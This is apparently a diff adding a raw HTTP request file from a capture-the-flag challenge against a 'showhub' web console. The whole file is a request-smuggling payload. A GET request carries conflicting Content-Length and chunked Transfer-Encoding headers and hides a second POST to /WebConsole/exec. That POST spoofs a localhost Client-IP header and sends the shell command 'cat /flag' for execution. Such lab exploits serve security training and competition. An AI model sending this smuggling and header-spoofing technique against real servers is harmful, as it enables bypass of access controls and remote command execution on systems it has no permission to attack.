@@ -1,0 +1,26 @@
+GET /WebConsole/ HTTP/1.1
+Host: 024ac2afef.showhub.d3ctf.io
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+DNT: 1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh,en;q=0.9,zh-CN;q=0.8
+Cookie: PHPSESSID=cgdbdc2211g074rnbklem2fv5k
+Content-Length: 228
+Transfer-Encoding: chunked
+
+0
+
+
+POST /WebConsole/exec HTTP/1.1
+Host: 024ac2afef.showhub.d3ctf.io
+Client-IP: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=cgdbdc2211g074rnbklem2fv5k
+Content-Length: 30
+
+cmd=cat /flag;
+
